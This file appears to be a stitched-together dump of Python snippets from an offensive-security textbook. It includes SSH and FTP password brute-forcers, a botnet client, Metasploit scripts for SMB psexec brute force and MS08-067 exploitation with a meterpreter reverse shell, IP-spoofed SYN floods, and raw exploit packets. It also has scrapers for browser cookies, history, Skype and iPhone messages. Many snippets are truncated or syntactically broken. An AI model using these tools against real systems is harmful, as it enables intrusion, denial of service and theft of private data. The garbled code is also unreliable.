def nmapScan(tgtHost,tgtPort): \n     nmScan = nmap.PortScanner() \n     nmScan.scan(tgtHost,tgtPort) \n     state=nmScan[tgtHost]['tcp'][int(tgtPort)]['state' \n
def addClient(host, user, password): \ n client = Client(host, user, password) \n botNet.append(client)
def viewPage(url): \n     browser = mechanize.Browser() \n     page = browser.open(url) \n     source_code = page.read() \n
def findTgts(subNet): \n     nmScan = nmap.PortScanner() \n     nmScan.scan(subNet, '445') \n     tgtHosts = [] \n     for host in nmScan.all_hosts(): \n         if nmScan[host].has_tcp(445): \n             state = nmScan[host]['tcp'][445]['state'] \n             if state == 'open': \n                 tgtHosts.append(host) \n     return tgtHosts \n
def printLinks(url): \n  \n     ab = anonBrowser() \n     ab.anonymize() \n     page = ab.open(url) \n     html = page.read() \n  \n     try: \n         link_finder = re.compile('href="(.*?)"') \n         links = link_finder.findall(html) \n         for link in links: \n             pass \n     except: \n pass \n  \n     try: \n         soup = BeautifulSoup(html) \n         links = soup.findAll(name='a') \n         for link in links: \n             if link.has_key('href'): \n                 pass \n     except: \n         pass \n
def testUserAgent(url, userAgent): \n     browser = mechanize.Browser() \n     browser.addheaders = userAgent \n     page = browser.open(url) \n     source_code = page.read() \n
    def connect(self): \n         try: \n             s = pxssh.pxssh() \n             s.login(self.host, self.user, self.password) \n             return s \n
def printCookies(url): \n     browser = mechanize.Browser() \n     cookie_jar = cookielib.LWPCookieJar() \n     browser.set_cookiejar(cookie_jar) \n     page = browser.open(url) \n     for cookie in cookie_jar: \n             pass \n
def printHistory(placesDB): \n     try: \n         conn = sqlite3.connect(placesDB) \n         c = conn.cursor() \n         c.execute("select url, datetime(visit_date/1000000,  'unixepoch') from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;") \n  \n         for row in c: \n             url = str(row[0]) \n             date = str(row[1]) \n     except Exception, e: \n         if 'encrypted' in str(e): \n             exit(0) \n
def spoofConn(src, tgt, ack): \n     IPlayer = IP(src=src, dst=tgt) \n     TCPlayer = TCP(sport=513, dport=514) \n     synPkt = IPlayer / TCPlayer \n     send(synPkt) \n  \n     IPlayer = IP(src=src, dst=tgt) \n     TCPlayer = TCP(sport=513, dport=514, ack=ack) \n     ackPkt = IPlayer / TCPlayer \n     send(ackPkt) \n
def findDownload(pcap): \n     for (ts, buf) in pcap: \n         try: \n             eth = dpkt.ethernet.Ethernet(buf) \n             ip = eth.data \n             src = socket.inet_ntoa(ip.src) \n             tcp = ip.data \n             http = dpkt.http.Request(tcp.data) \n             if http.method == 'GET': \n                 uri = http.uri.lower() \n                 if '.zip' in uri and 'loic' in uri: \n                     pass \n         except: \n             pass \n
def printCookies(cookiesDB): \n     try: \n         conn = sqlite3.connect(cookiesDB) \n         c = conn.cursor() \n         c.execute('SELECT host, name, value FROM moz_cookies') \n  \n         for row in c: \n             host = str(row[0]) \n             name = str(row[1]) \n             value = str(row[2] \n
def google(search_term): \n     ab = anonBrowser() \n  \n     search_term = urllib.quote_plus(search_term) \n     response = ab.open('http://ajax.googleapis.com/'+      'ajax/services/search/web?v=1.0&q='+ search_term) \n     objects = json.load(response) \n     results = [] \n  \n     for result in objects['responseData']['results']: \n         url = result['url'] \n         title = result['titleNoFormatting'] \n         text = result['content'] \n         new_gr = Google_Result(title, text, url) \n         results.append(new_gr) \n     return results \n
def google(search_term): \n     ab = anonBrowser() \n  \n     search_term = urllib.quote_plus(search_term) \n     response = ab.open('http://ajax.googleapis.com/'+      'ajax/services/search/web?v=1.0&q='+ search_term) \n     objects = json.load(response) \n
def google(search_term): \n     ab = anonBrowser() \n  \n     search_term = urllib.quote_plus(search_term) \n     response = ab.open('http://ajax.googleapis.com/'+       'ajax/services/search/web?v=1.0&q='+ search_term) \n
    def __init__(self, handle): \n         self.handle = handle \n         self.tweets = self.get_tweets() \n
    def get_tweets(self): \n         query = urllib.quote_plus('from:' + self.handle+ ' since:2009-01-01 include:retweets') \n         tweets = [] \n         browser = anonBrowser() \n         browser.anonymize() \n         response = browser.open('http://search.twitter.com/'+ 'search.json?q=' + query) \n  \n         json_objects = json.load(response) \n         for result in json_objects['results']: \n             new_result = {} \n             new_result['from_user'] = result['from_user_name'] \n             new_result['geo'] = result['geo'] \n             new_result['tweet'] = result['text'] \n             tweets.append(new_result) \n         return tweets \n
    def find_interests(self): \n         interests = {} \n         interests['links'] = [] \n         interests['users'] = [] \n         interests['hashtags'] = [] \n  \n         for tweet in self.tweets: \n             text = tweet['tweet'] \n             links = re.compile('(http.*?)\Z|(http.*?) ').findall(text) \n  \n             for link in links: \n                 if link[0]: \n                     link = link[0] \n                 elif link[1]: \n                     link = link[1] \n                 else: \n                     continue \n  \n             try: \n                 response = urllib2.urlopen(link) \n                 full_link = response.url \n                 interests['links'].append(full_link) \n             except: \n                 pass \n             interests['users'] +=  re.compile('(@\w+)').findall(text) \n             interests['hashtags'] +=               re.compile('(#\w+)').findall(text) \n  \n         interests['users'].sort() \n         interests['hashtags'].sort() \n         interests['links'].sort() \n         return interests \n
    def twitter_locate(self, cityFile): \n         cities = [] \n         if cityFile != None: \n             for line in open(cityFile).readlines(): \n                 city = line.strip('\n').strip('\r').lower() \n                 cities.append(city) \n  \n         locations = [] \n         locCnt = 0 \n         cityCnt = 0 \n         tweetsText = '' \n  \n         for tweet in self.tweets: \n             if tweet['geo'] != None: \n                 locations.append(tweet['geo']) \n                 locCnt += 1 \n  \n             tweetsText += tweet['tweet'].lower() \n  \n         for city in cities: \n             if city in tweetsText: \n                 locations.append(city) \n                 cityCnt += 1 \n  \n         return locations \n
def load_cities(cityFile): \n     cities = [] \n     for line in open(cityFile).readlines(): \n city=line.strip('\n').strip('\r').lower() \n cities.append(city) \n     return cities \n
def twitter_locate(tweets,cities): \n     locations = [] \n     locCnt = 0 \n     cityCnt = 0 \n     tweetsText = "" \n  \n     for tweet in tweets: \n         if tweet['geo'] != None: \n             locations.append(tweet['geo']) \n             locCnt += 1  \n  \n tweetsText += tweet['tweet'].lower() \n  \n     for city in cities: \n if city in tweetsText: \n     locations.append(city) \n     cityCnt+=1 \n return locations \n
def get_tweets(handle): \n     query = urllib.quote_plus('from:' + handle+       ' since:2009-01-01 include:retweets') \n     tweets = [] \n     browser = anonBrowser() \n     browser.anonymize() \n  \n     response = browser.open('http://search.twitter.com/'+      'search.json?q='+ query) \n  \n     json_objects = json.load(response) \n     for result in json_objects['results']: \n         new_result = {} \n         new_result['from_user'] = result['from_user_name'] \n         new_result['geo'] = result['geo'] \n         new_result['tweet'] = result['text'] \n         tweets.append(new_result) \n  \n     return tweets \n
    def __init__(self,first_name,last_name,      job='',social_media={}): \n         self.first_name = first_name \n         self.last_name = last_name \n         self.job = job \n         self.social_media = social_media \n
    def __repr__(self): \n         return self.first_name + ' ' +          self.last_name + ' has job ' + self.job \n
    def get_social(self, media_name): \n         if self.social_media.has_key(media_name): \n             return self.social_media[media_name] \n
    def query_twitter(self, query): \n         query = urllib.quote_plus(query) \n         results = [] \n         browser = anonBrowser() \n         response = browser.open(          'http://search.twitter.com/search.json?q='+ query) \n         json_objects = json.load(response) \n         for result in json_objects['results']: \n             new_result = {} \n             new_result['from_user'] = result['from_user_name'] \n             new_result['geo'] = result['geo'] \n             new_result['tweet'] = result['text'] \n             results.append(new_result) \n
def sendMail(user,pwd,to,subject,text): \n  \n     msg = MIMEText(text) \n     msg['From'] = user \n     msg['To'] = to \n     msg['Subject'] = subject \n  \n     try: \n smtpServer = smtplib.SMTP('smtp.gmail.com', 587) \n smtpServer.ehlo() \n smtpServer.starttls() \n smtpServer.ehlo() \n smtpServer.login(user, pwd) \n smtpServer.sendmail(user, to, msg.as_string()) \n smtpServer.close() \n  \n     except: \n      pass \n
    def __init__(self,title,text,url): \n         self.title = title \n         self.text = text \n         self.url = url \n
def send_command(child, cmd): \n     child.sendline(cmd) \n     child.expect(PROMPT)
def exploitTest(src, dst, iface, count): \n      \n     pkt = IP(src=src, dst=dst) / UDP(dport=518)  /Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8") \n     send(pkt, iface=iface, count=count) \n      \n     pkt = IP(src=src, dst=dst) / UDP(dport=635) /Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F") \n     send(pkt, iface=iface, count=count \n
def smbBrute(configFile,tgtHost,passwdFile,lhost,lport): \n     username = 'Administrator' \n     pF = open(passwdFile, 'r') \n     for password in pF.readlines(): \n         password = password.strip('\n').strip('\r') \n         configFile.write('use exploit/windows/smb/psexec\n') \n         configFile.write('set SMBUser ' + str(username) + '\n') \n         configFile.write('set SMBPass ' + str(password) + '\n') \n         configFile.write('set RHOST ' + str(tgtHost) + '\n') \n         configFile.write('set payload '+\ \n           'windows/meterpreter/reverse_tcp\n') \n         configFile.write('set LPORT ' + str(lport) + '\n') \n         configFile.write('set LHOST ' + lhost + '\n') \n         configFile.write('exploit -j -z\n') \n
def setupHandler(configFile, lhost, lport): \n     configFile.write('use exploit/multi/handler\n') \n     configFile.write('set payload '+\ \n       'windows/meterpreter/reverse_tcp\n') \n     configFile.write('set LPORT ' + str(lport) + '\n') \n     configFile.write('set LHOST ' + lhost + '\n') \n     configFile.write('exploit -j -z\n') \n     configFile.write('setg DisablePayloadHandler 1\n') \n
    def __init__(self, host, user, password): \n         self.host = host \n         self.user = user \n         self.password = password \n         self.session = self.connect() \n
    def synFlood(src, tgt): \n     for sport in range(1024,65535): \n         IPlayer = IP(src=src, dst=tgt) \n         TCPlayer = TCP(sport=sport, dport=513) \n         pkt = IPlayer / TCPlayer \n         send(pkt) \n
def printDownloads(downloadDB): \n     conn = sqlite3.connect(downloadDB) \n     c = conn.cursor() \n     c.execute('SELECT name, source, datetime(endTime/1000000,\'unixepoch\') FROM moz_downloads;' \n
def testForExif(imgFileName): \n     try: \n         exifData = {} \n         imgFile = Image.open(imgFileName) \n         info = imgFile._getexif() \n         if info: \n             for (tag, value) in info.items(): \n                 decoded = TAGS.get(tag, tag) \n                 exifData[decoded] = value \n             exifGPS = exifData['GPSInfo'] \n     except: \n         pass \n
def returnDefault(ftp): \n     try: \n         dirList = ftp.nlst() \n     except: \n         dirList = [] \n         return \n  \n     retList = [] \n     for fileName in dirList: \n         fn = fileName.lower() \n         if '.php' in fn or '.htm' in fn or '.asp' in fn: \n            retList.append(fileName) \n     return retList \n
def isMessageTable(iphoneDB): \n     try: \n         conn = sqlite3.connect(iphoneDB) \n         c = conn.cursor() \n         c.execute('SELECT tbl_name FROM sqlite_master WHERE type==\"table\";') \n         for row in c: \n             if 'message' in str(row): \n                 return True \n     except: \n         return False \n
def findAttack(pcap): \n     pktCount = {} \n     for (ts, buf) in pcap: \n         try: \n             eth = dpkt.ethernet.Ethernet(buf) \n             ip = eth.data \n             src = socket.inet_ntoa(ip.src) \n             dst = socket.inet_ntoa(ip.dst) \n             tcp = ip.data \n             dport = tcp.dport \n             if dport == 80: \n                 stream = src + ':' + dst \n                 if pktCount.has_key(stream): \n                     pktCount[stream] = pktCount[stream] + 1 \n                 else: \n                     pktCount[stream] = 1 \n         except: \n             pass \n
def connect(user,host,keyfile,release): \n     global Stop \n     global Fails \n     try: \n         perm_denied = 'Permission denied' \n         ssh_newkey = 'Are you sure you want to continue' \n         conn_closed = 'Connection closed by remote host' \n         opt = ' -o PasswordAuthentication=no' \n         connStr = 'ssh ' + user +\ \n           '@' + host + ' -i ' + keyfile + opt \n         child = pexpect.spawn(connStr) \n         ret = child.expect([pexpect.TIMEOUT,perm_denied,ssh_newkey,conn_closed,'$','#',]) \n         if ret == 2: \n             child.sendline('yes') \n             connect(user, host, keyfile, False) \n         elif ret == 3: \n             Fails += 1 \n         elif ret > 3: \n             Stop = True \n     finally: \n         if release: \n             connection_lock.release() \n
def mirrorImages(url, dir): \n     ab = anonBrowser() \n     ab.anonymize() \n     html = ab.open(url) \n     soup = BeautifulSoup(html) \n     image_tags = soup.findAll('img') \n  \n     for image in image_tags: \n         filename = image['src'].lstrip('http://') \n         filename = os.path.join(dir,filename.replace('/', '_')) \n         data = ab.open(image['src']).read() \n         ab.back() \n         save = open(filename, 'wb') \n         save.write(data) \n         save.close() \n
def bruteLogin(hostname, passwdFile): \n     pF = open(passwdFile, 'r') \n     for line in pF.readlines(): \n         time.sleep(1) \n         userName = line.split(':')[0] \n         passWord = line.split(':')[1].strip('\r').strip('\n') \n         try: \n             ftp = ftplib.FTP(hostname) \n             ftp.login(userName, passWord) \n             ftp.quit() \n             return (userName, passWord) \n         except Exception, e: \n             pass \n     return (None, None) \n
def retKML(ip): \n     rec = gi.record_by_name(ip) \n     try: \n         longitude = rec['longitude'] \n         latitude = rec['latitude'] \n         kml = (               '<Placemark>\n', '<name>%s</name>\n',  '<Point>\n', '<coordinates>%6f, %6f</coordinates>\n',           '</Point>\n','</Placemark>\n') \n         return kml \n     except: \n         return ' \n
def connect(user, host, password): \n     ssh_newkey = 'Are you sure you want to continue connecting' \n     connStr = 'ssh ' + user + '@' + host \n     child = pexpect.spawn(connStr) \n     ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:']) \n      \n     if ret == 0: \n         return \n      \n     if ret == 1: \n         child.sendline('yes') \n         ret = child.expect([pexpect.TIMEOUT, \ \n                             '[P|p]assword:']) \n     if ret == 0: \n         return \n      \n     child.sendline(password) \n     child.expect(PROMPT) \n     return child \n
def findImages(url): \n     urlContent = urllib2.urlopen(url).read() \n     soup = BeautifulSoup(urlContent) \n     imgTags = soup.findAll('img') \n     return imgTags \n
def downloadImage(imgTag): \n     try: \n         imgSrc = imgTag['src'] \n         imgContent = urllib2.urlopen(imgSrc).read() \n         imgFileName = basename(urlsplit(imgSrc)[2]) \n         imgFile = open(imgFileName, 'wb') \n         imgFile.write(imgContent) \n         imgFile.close() \n         return imgFileName \n     except: \n         return '' \n
def printGoogle(placesDB): \n     conn = sqlite3.connect(placesDB) \n     c = conn.cursor() \n     c.execute("select url, datetime(visit_date/1000000,  'unixepoch') from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;") \n     for row in c: \n         url = str(row[0]) \n         date = str(row[1]) \n         if 'google' in url.lower(): \n             r = re.findall(r'q=.*\&', url) \n             if r: \n                 search=r[0].split('&')[0] \n                 search=search.replace('q=', '').replace('+', ' ') \n
def printMessages(skypeDB): \n     conn = sqlite3.connect(skypeDB) \n     c = conn.cursor() \n     c.execute("SELECT datetime(timestamp,'unixepoch'),dialog_partner, author, body_xml FROM Messages;") \n  \n     for row in c: \n         try: \n             if 'partlist' not in str(row[3]): \n                 if str(row[1]) != str(row[2]): \n                     msgDirection = 'To ' + str(row[1]) + ': ' \n                 else: \n                     msgDirection = 'From ' + str(row[2]) + ' : ' \n         except: \n             pas \n
def anonLogin(hostname): \n     try: \n         ftp = ftplib.FTP(hostname) \n         ftp.login('anonymous', 'me@your.com') \n         ftp.quit() \n         return True \n     except Exception, e: \n      return False \n
def connScan(tgtHost, tgtPort): \n     try: \n         connSkt = socket(AF_INET, SOCK_STREAM) \n         connSkt.connect((tgtHost, tgtPort)) \n         connSkt.send('ViolentPython\r\n') \n         results = connSkt.recv(100) \n         screenLock.acquire() \n     except: \n         screenLock.acquire() \n     finally: \n         screenLock.release() \n         screenLock.close() 
    def send_command(self, cmd): \n         self.session.sendline(cmd) \n         self.session.prompt() \n         return self.session.before \n
def printMessage(msgDB): \n     try: \n         conn = sqlite3.connect(msgDB) \n         c = conn.cursor() \n         c.execute('select datetime(date,\'unixepoch\'),address, text from message WHERE address>0;') \n         for row in c: \n             date = str(row[0]) \n             addr = str(row[1]) \n             text = row[2] \n     except: \n         pass \n
def connect(host, user, password): \n     try: \n         s = pxssh.pxssh() \n         s.login(host, user, password) \n         return s \n     except: \n         exit(0) \n
def printPcap(pcap): \n     for (ts, buf) in pcap: \n         try: \n             eth = dpkt.ethernet.Ethernet(buf) \n             ip = eth.data \n             src = socket.inet_ntoa(ip.src) \n             dst = socket.inet_ntoa(ip.dst) \n         except: \n             pass \n
def testTTL(pkt): \n     try: \n         if pkt.haslayer(IP): \n             ipsrc = pkt.getlayer(IP).src \n             ttl = str(pkt.ttl) \n             checkTTL(ipsrc, ttl) \n     except: \n         pass \n
def retGeoStr(ip): \n     try: \n         rec = gi.record_by_name(ip) \n         city = rec['city'] \n         country = rec['country_code3'] \n         if city != '': \n             geoLoc = city + ', ' + country \n         else: \n             geoLoc = country \n         return geoLoc \n     except Exception, e: \n         return 'Unregistered' \n
def confickerExploit(configFile,tgtHost,lhost,lport): \n     configFile.write('use exploit/windows/smb/ms08_067_netapi\n') \n     configFile.write('set RHOST ' + str(tgtHost) + '\n') \n     configFile.write('set payload '+\ \n       'windows/meterpreter/reverse_tcp\n') \n     configFile.write('set LPORT ' + str(lport) + '\n') \n     configFile.write('set LHOST ' + lhost + '\n') \n     configFile.write('exploit -j -z\n') \n
def connect(host, user, password, release): \n     global Found \n     global Fails \n  \n     try: \n         s = pxssh.pxssh() \n         s.login(host, user, password) \n         Found = True \n     except Exception, e: \n         if 'read_nonblocking' in str(e): \n      Fails += 1 \n             time.sleep(5) \n             connect(host, user, password, False) \n elif 'synchronize with original prompt' in str(e): \n     time.sleep(1) \n     connect(host, user, password, False) \n
